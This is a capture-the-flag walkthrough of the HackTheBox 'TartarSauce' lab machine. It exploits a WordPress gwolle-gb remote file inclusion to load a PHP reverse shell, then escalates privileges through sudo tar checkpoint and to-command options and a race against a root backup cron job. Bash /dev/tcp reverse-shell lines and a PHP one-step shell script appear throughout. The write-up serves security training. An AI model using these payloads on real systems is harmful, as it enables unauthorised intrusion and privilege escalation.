---
title: HTB: TartarSauce
url: https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html
date: 2018-10-20T11:27:03+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-tartarsauce, hackthebox, wordpress, wpscan, php, webshell, rfi, sudo, tar, pspy, monstra, cron, oscp-like-v2, oscp-like-v1
---

![](https://0xdfimages.gitlab.io/img/tartar-cover.png)TartarSauce was a box with lots of steps, and an interesting focus around two themes: trolling us, and the tar binary. For initial access, I’ll find a barely functional WordPress site with a plugin vulnerable to remote file include. After abusing that RFI to get a shell, I’ll privesc twice, both times centered around tar; once through sudo tar, and once needing to manipulate an archive before a sleep runs out. In beyond root, I’ll look at some of the rabbit holes I went down, and show a short script I created to quickly get initial access and do the first privesc in one step.

## Box Info

| Name | [TartarSauce](https://hackthebox.com/machines/tartarsauce)  [TartarSauce](https://hackthebox.com/machines/tartarsauce) [Play on HackTheBox](https://hackthebox.com/machines/tartarsauce) |
| --- | --- |
| Release Date | 12 May 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for TartarSauce |
| Radar Graph | Radar chart for TartarSauce |
| First Blood User | 01:11:38[phra phra](https://app.hackthebox.com/users/19822) |
| First Blood Root | 04:16:42[mprox mprox](https://app.hackthebox.com/users/16690) |
| Creators | [3mrgnc3 3mrgnc3](https://app.hackthebox.com/users/6983)  [ihack4falafel ihack4falafel](https://app.hackthebox.com/users/2963) |

## nmap

The only open port is web on 80:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.88
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-22 12:21 EDT
Warning: 10.10.10.88 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.88
Host is up (0.098s latency).
Not shown: 65467 closed ports, 67 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.34 seconds

root@kali# nmap -sC -sV -p 80 -oA nmap/initial 10.10.10.88
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-22 12:25 EDT
Nmap scan report for 10.10.10.88
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds

```

The box looks like Ubuntu, likely Xenial 16.04 based on the Apache version.

`nmap` also reveals a `/robots.txt`, which gives some interesting paths to exploit. These are all rabbit holes, but I’ll walk through my exploration at the [end of this post](#rabbit-hole-monstra-cms).

## Website - Port 80

### Site

The site itself is a giant ascii art of a bottle of tartar sauce:

![1527006309843](https://0xdfimages.gitlab.io/img/1527006309843.png)

Looking at the source, there’s a bunch of empty lines, followed by a comment, `<!--Carry on, nothing to see here :D-->`. Looks like the box author likes to troll.

### gobuster

Back to enumeration after deciding that the Monstra CMS was a dead end. `gobuster` provides another path, `/webservices`:

```

root@kali# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88 -o gobuster/port80root.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.88/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Output file  : gobuster/port80root.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .txt,.php,.html
=====================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/webservices (Status: 301)
=====================================================

```

Trying to access the `/webservices` url just returns a 403 forbidden. But another round of `gobuster` gives a `/wp` path:

```

root@kali# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88/webservices -o gobuster/port80webservices -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.88/webservices/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Output file  : gobuster/port80webservices
[+] Status codes : 307,200,204,301,302
[+] Extensions   : .txt,.php,.html
=====================================================
/wp (Status: 301)
=====================================================

```

### WordPress Site

#### Site

The site is broken.

![1527526664696](https://0xdfimages.gitlab.io/img/1527526664696.png)

WordPress sites are commonly broken in htb because they link to things using the dns names, and that can be fixed by adding the hostname to the `/etc/hosts` file. That is not the case here. Looking at the page source, there’s a bunch of links that look like this: `<link rel="alternate" type="application/rss+xml" title="Test blog &raquo; Feed" href="http:/10.10.10.88/webservices/wp/index.php/feed/" />`

Someone left the second `/` off after `http:`. This can be fixed using burp, to modify requests or responses. I added this filter:

![1527526834227](https://0xdfimages.gitlab.io/img/1527526834227.png)

With that, the page loads, albeit still only a 404:

![1527526872427](https://0xdfimages.gitlab.io/img/1527526872427.png)

#### wpscan

`wpscan` is a good tool to enumerate WordPress sites. I’ll use `--enumerate p,t,u` option to enumerate plugins, themes, and users. The output is quite long, but snipped to show that it identifies three plugins:

```

root@kali# wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________
...
[+] We found 3 plugins:

[+] Name: akismet - v4.0.3
 |  Last updated: 2018-05-26T17:14:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 4.0.6

[+] Name: brute-force-login-protection - v1.5.3
 |  Latest version: 1.5.3 (up to date)
 |  Last updated: 2017-06-29T10:39:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] Name: gwolle-gb - v2.3.10
 |  Last updated: 2018-05-12T10:06:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
[!] The version is out of date, the latest version is 2.5.2

[+] Enumerating installed themes (only ones marked as popular) ...
...

```

While none of those appear vulnerable to anything, looking at the readmes for each reveals something interesting… from `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt`:

```

== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

```

So, this box author definitely likes to troll.

## Shell as www-data

### RFI in gwolle-gb

There’s a [RFI vulnerability in Gwolle Guestbook v 1.5.3](https://www.htbridge.com/advisory/HTB23275). In this case, visiting `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path` will include that file.

### POC

To test this, I first started a python http server on my host, and then visited the site:

```

root@kali# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/

```

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.88 - - [28/May/2018 15:10:22] "GET /wp-load.php HTTP/1.0" 404 -

```

### Shell

I’ll grab `php-reverse-shell.php` from `/usr/share/webshells/php` on Kali. There’s a couple lines you have to customize with your own IP and desired callback port. Then I’ll name it `wp-load.php`, and open a `nc` listener, and run that `curl` again:

```

root@kali# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/

```

```
10.10.10.88 - - [28/May/2018 15:15:03] "GET /wp-load.php HTTP/1.0" 200 -

```

```

root@kali# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.15.99] from (UNKNOWN) [10.10.10.88] 43868
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 i686 i686 GNU/Linux
 15:15:43 up  2:35,  0 users,  load average: 0.15, 0.04, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Privesc: www-data –> onuma

As `www-data`, we can’t get into the lone user directory:

```

www-data@TartarSauce:/home$ ls
onuma
www-data@TartarSauce:/home$ cd onuma/
bash: cd: onuma/: Permission denied

```

### sudo tar

Notice that user `www-data` can run `sudo` with no password for `/bin/tar`:

```

www-data@TartarSauce:/dev/shm$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar

```

### Two Ways to Escalate with sudo tar

#### –to-command

The take advantage of this, first create a shell script that will provide a reverse shell to my host. Then put it into a tar archive.

```

www-data@TartarSauce:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.99/8082 0>&1' > a.sh
www-data@TartarSauce:/dev/shm$ tar -cvf a.tar a.sh
a.sh

```

Then I’ll run `tar` with the `--to-command` option. This option takes the output of the tar command, and passes it to another binary for processing. In this case, I’m having my shell script to get a shell passed to bash to run it.

```

www-data@TartarSauce:/dev/shm$ sudo -u onuma tar -xvf a.tar --to-command /bin/bash

```

And I get a callback as onuma:

```

root@kali# nc -lnvp 8082
listening on [any] 8082 ...
connect to [10.10.15.99] from (UNKNOWN) [10.10.10.88] 47320
onuma@TartarSauce:/dev/shm$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
onuma@TartarSauce:/dev/shm$

```

#### –checkpoint-action

But even better, this privesc can be done in one line!

We’ll take advantage of the `tar` options for checkpoints. The `--checkpoint=x` flag tells tar to take some action every x bytes, as a progress update. The default behavior is to print a status message. However, the `--checkpoint-action` parameter allows the user to specify what action to take at a check point. So I can have it just give me a shell:

```

www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
<ll /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
onuma@TartarSauce:/$ id
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)

```

### user.txt

The shell, get user flag:

```

onuma@TartarSauce:~$ wc -c user.txt
33 user.txt
onuma@TartarSauce:~$ cat user.txt
b2d6ec45...

```

## Partial Privesc: onuma –> File Read as root

As far as I know, there’s no way to exploit this box to get a root shell. But I can read files as root.

### Identify cron with pspy

[pspy](https://github.com/DominicBreuker/pspy) is my go-to for processes detection. In this case, letting `pspy32` run for a bit shows a script that runs as root every 5 minutes:

```

2018/05/29 07:56:33 CMD: UID=0    PID=24065  | /bin/bash /usr/sbin/backuperer

```

### Understanding backeruperer

The script is as follows:

```

#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up in case another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi

```

I’ll try to break this down into it’s important steps:
1. Use the `tar` command as onuma to take everything in `$basedir` (`/var/www/html`) and save it as a gzip archive (`-z`) named `$tmpfile`. `$tmpfle` is `/var/tmp/.[random sha1]`, so we know it will start with a `.`, and what folder it will be in, but nothing else.

   ```

   # Backup onuma website dev files.
   /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

   ```
2. Sleep for 30 seconds:

   ```

   # Added delay to wait for backup to complete if large files get added.
   /bin/sleep 30

   ```
3. Make a temporary directory at `/var/tmp/check`:

   ```

   /bin/mkdir $check

   ```
4. Extract `$tmpfile` into `/var/tmp/check`:

   ```

   /bin/tar -zxvf $tmpfile -C $check

   ```
5. Run the `integrity_chk` function, and it is exits cleanly, move the temp archive to `/var/backups/onuma-www-dev.bak`, and if not, run `integrity_chk` again, and append its output to `/vat/backups/onuma_backup_error.txt`

   ```

   if [[ $(integrity_chk) ]]
   then
       # Report errors so the dev can investigate the issue.
       /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
       integrity_chk >> $errormsg
       exit 2
   else
       # Clean up and save archive to the bkpdir.
       /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
       /bin/rm -rf $check .*
       exit 0
   fi

   ```

The `integrity_chk` function is very simple, a recursive `diff` between the source directory `/var/www/html` and the same directory that was taken out of the gzip archive.

### Exploiting backeruperer

To exploit this script, I’ll take advantage of two things: the sleep, and the recursive diff. During the sleep, I’ll unpack the archive, replace one of the files with a link to `/root/root.txt`, and re-archive it. Then when the script opens the archive and runs the diff, the resulting file will be different, and the contents of both files will end up in the log file.

I originally did this with a long bash one-liner, but it is easier to follow with a script:

```

#!/bin/bash

# work out of shm
cd /dev/shm

# set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

# get filename
fn=$(echo $cur | cut -d'/' -f4)

# extract archive
tar -zxf $fn

# remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# remove old archive
rm $fn

# create new archive
tar czf $fn var

# put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

# wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt

```

Now, upload this to target and run it. I’ll name it `.b.sh` for opsec:

```

onuma@TartarSauce:/dev/shm$ ./.b.sh
./.b.sh
Waiting for archive filename to change...
File changed... copying here
Waiting for new logs...
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Thu Oct 18 19:42:26 EDT 2018
------------------------------------------------------------------------
/var/tmp/.02af91fa0edeab13fce3962cddc45efefc22da67
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
<
---
> e79abdab...

```

And there’s the flag.

As a one-liner, it looks like this:

```

onuma@TartarSauce:/dev/shm$ cd /dev/shm; start=$(find /var/tmp -maxdepth 1 -type f -name ".*"); cur=$(find /var/tmp -maxdepth 1 -type f -name ".*"); while [ "$start" == "$cur" -o "$cur" == "" ] ; do sleep 10; cur=$(find /var/tmp -maxdepth 1 -type f -name ".*"); done; echo "File changed... copying here"; cp $cur .; fn=$(echo $cur | cut -d'/' -f4); tar -zxf $fn; rm var/www/html/robots.txt; ln -s /root/root.txt var/www/html/robots.txt; rm $fn; tar czf $fn var; mv $fn $cur; rm $fn; rm -rf var
File changed... copying here

onuma@TartarSauce: cat /var/backups/onuma_backup_error.txt
...
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Wed May 30 09:38:30 EDT 2018
------------------------------------------------------------------------
/var/tmp/.154b63306d83a3c63fb5d432d97be7807b521909
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
<
---
> e79abdab...
Only in /var/www/html/webservices/monstra-3.0.4/public/uploads: .empty

```

## Beyond Root

### Shortcut Shell as onuma

In case I ever wanted to come back to this box and pick up with a shell as onuma, this alternative php script will provide a reverse shell as onuma.

```

root@kali# cat awp-load.php
<?php
system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.5/8082 0>&1' > /dev/shm/.a.sh");
system("cd / && sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/.a.sh\"");
?>

```

The script simply has php system commands take the steps shown in [privesc](#privesc-www-data--onuma) above, writing a shell script, putting it into a tar archive, and then using `sudo tar` to run it.

So to make it work, just start `python3 -m http.server 80`, `nc` on 8082, and run `curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/a`.

### Rabbit Hole: Monstra CMS

Another super trollish move by the author is adding a `robot.txt` file with multiple interesting sites, one of which exists, and is has RCE vulnerabilities against it, and yet, none of them can work. Here’s how I explored it anyway, and why the exploits don’t work.

#### robots.txt

`nmap` calls out the presence of a `robots.txt` file with several interesting looking sites:

```

User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/

```

I’ll use a quick bash loop to grab the disallow entries, get the url paths, and loop over them, for each echoing a header line, and then issuing a curl to get them. Of the five urls, only one doesn’t return a 404 not found error:

```

root@kali# curl -s 10.10.10.88/robots.txt | tail -6 | head -5 | cut -d' ' -f2 | while read p; do echo ===${p}===; curl -s 10.10.10.88${p} | head; echo; done
===/webservices/tar/tar/source/===
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /webservices/tar/tar/source/ was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
</body></html>

===/webservices/monstra-3.0.4/===
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="/webservices/monstra-3.0.4" />
<link rel="dns-prefetch" href="//www.google-analytics.com" />
<title>TartarSauce - Home</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Site description">

===/webservices/easy-file-uploader/===
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /webservices/easy-file-uploader/ was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
</body></html>

===/webservices/developmental/===
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /webservices/developmental/ was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
</body></html>

===/webservices/phpmyadmin/===
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /webservices/phpmyadmin/ was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
</body></html>

```

#### Site

Looking at the page itself, it’s a default landing page, and most the links are broken:

![1527018851631](https://0xdfimages.gitlab.io/img/1527018851631.png)

The link in the center of that page `logged in` takes us to a login page:

![1527018911893](https://0xdfimages.gitlab.io/img/1527018911893.png)

Fortunately, the username / password of `admin` / `admin` gets us in:

![1527018951948](https://0xdfimages.gitlab.io/img/1527018951948.png)

#### Exploit Attempts

`monstra CMS v3.0.4` has several vulnerabilities in it:

```

root@kali# searchsploit monstra
-------------------------------------------------- -----------------------------------
 Exploit Title                                    |  Path
                                                  | (/usr/share/exploitdb/)
-------------------------------------------------- -----------------------------------
Monstra CMS 1.2.0 - 'login' SQL Injection         | exploits/php/webapps/38769.txt
Monstra CMS 1.2.1 - Multiple HTML Injection Vulne | exploits/php/webapps/37651.html
Monstra CMS 3.0.3 - Multiple Vulnerabilities      | exploits/php/webapps/39567.txt
Monstra CMS 3.0.4 - Arbitrary File Upload / Remot | exploits/php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion     | exploits/php/webapps/44512.txt
Monstra CMS 3.0.4 - Remote Code Execution         | exploits/php/webapps/44621.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scriptin | exploits/php/webapps/44502.txt
-------------------------------------------------- -----------------------------------
Shellcodes: No Result

```

The RCE (44621) requires access as a user who can upload. The Arbitrary File Upload (43348) requires a user who can edit. So does the XSS (44502).

The `admin` access looks like it gives file upload, but everything just fails.

#### Failure Explanation

With a shell on the box, it’s quickly clear why the file uploads fail. The folder structure starting with the `/webservices` path are owned and only writable by root:

```

onuma@TartarSauce:/var/www$ ls -la html
total 28
drwxr-xr-x 3 www-data www-data  4096 Feb 21  2018 .
drwxr-xr-x 3 root     root      4096 Feb  9  2018 ..
-rw-r--r-- 1 root     root     10766 Feb 21  2018 index.html
-rw-r--r-- 1 root     root       208 Feb 21  2018 robots.txt
drwxr-xr-x 4 root     root      4096 Feb 21  2018 webservices

```

For example, Monsta tries to upload files to `/var/www/html/webservices/monstra-3.0.4/public/uploads`, but that folder can’t be written to by www-data, which is what Apache is running as:

```

onuma@TartarSauce:/var/www/html/webservices/monstra-3.0.4/public$ ls -ld uploads
drw-rw-r-x 2 root root 4096 Feb 21  2018 uploads

```

The WordPress site has the same permissions. I just didn’t need to write anything to use the RFI vulnerability to get a shell.

[backuperer Follow-Up »](/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html)